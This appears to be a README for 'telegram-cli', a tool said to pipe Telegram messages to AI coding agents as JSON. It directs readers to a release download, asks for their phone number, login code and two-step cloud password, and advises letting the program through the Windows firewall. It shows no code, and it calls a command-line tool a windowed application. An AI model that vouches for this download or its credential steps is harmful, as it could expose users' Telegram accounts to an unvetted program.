# 🤖 telegram-cli - Connect AI agents to Telegram services

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Lawntennisnovice323/telegram-cli)

Telegram-cli links your Telegram account to AI tools. It allows agents like Claude Code, Cursor, and GitHub Copilot to read messages and send replies using structured data formats. This tool works for users who want to automate tasks or build custom workflows within their chat environment.

## 🔑 Linking your Telegram account

The software requires permission to access your Telegram data safely.

1. Open the application.
2. Enter your phone number tied to your Telegram account.
3. Check your mobile Telegram app for a login code.
4. Type that code into the verification field in the software.
5. If you use two-step verification, enter your cloud password when asked.

The program creates a session file on your computer. This file keeps you logged in so you do not need to enter your code every time you restart the application.

## 🛠️ Using agents with the service

This tool sends your Telegram data to AI systems in a format they understand. This format is called JSON. 

1. Decide which AI agent you want to use.
2. Open your agent settings within the tool.
3. Select the channels or conversations you want the agent to monitor.
4. Save your configuration.

The tool now watches for new messages. When a message arrives, it converts the text into a clean data structure. Your selected AI agent reads this data and creates a response based on the instructions you provide in the agent's prompts.

## 📝 Understanding the output

Structured data looks like a organized list of information. Instead of a messy chat history, the agent sees:

* The sender name.
* The exact timestamp of the message.
* The message content.
* Any media file links attached to the message.

This structure helps AI agents make fewer mistakes when processing your requests.

## 🛠️ Troubleshooting common issues

If the application does not work, try these fixes:

* Restart the application: Close the window and open it again.
* Check your internet: Ensure your primary Telegram app works correctly on your phone.
* Refresh the session: If the app reports a login error, navigate to the settings menu and click "Log Out," then sign in again with your phone number.
* Update firewall settings: Make sure your Windows Security settings allow this program to talk to the internet.

## 🔒 Privacy and security

The software stores your credentials locally on your own computer. It does not send your private passwords to external servers. It only sends the message content that you select to the specific AI agents you choose. Keep your session files private. Do not share your computer folder with people you do not trust.
